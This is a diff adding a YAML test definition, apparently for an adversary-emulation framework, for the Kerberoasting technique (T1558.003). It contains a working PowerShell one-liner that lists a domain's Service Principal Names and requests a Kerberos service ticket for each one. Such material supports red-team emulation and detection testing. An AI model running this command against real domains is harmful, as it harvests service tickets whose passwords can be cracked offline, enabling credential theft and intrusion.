@@ -1,0 +1,22 @@
+---
+- id: 2f03250355bb1403dcfac6808782a192
+  name: Request All Tickets via PowerShell
+  description: "The following test will utilize native PowerShell Identity modules\
+    \ to query the domain to extract allthe Service Principal Names. This behavior\
+    \ is typically used during a kerberos or silver ticket attack. \nA successful\
+    \ execution will output the SPNs for the domain in question.\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: Add-Type -AssemblyName System.IdentityModel  ; setspn.exe -T %USERDNSDOMAIN%
+          -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
+          -ArgumentList $_.Context.PostContext[0].Trim() }
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
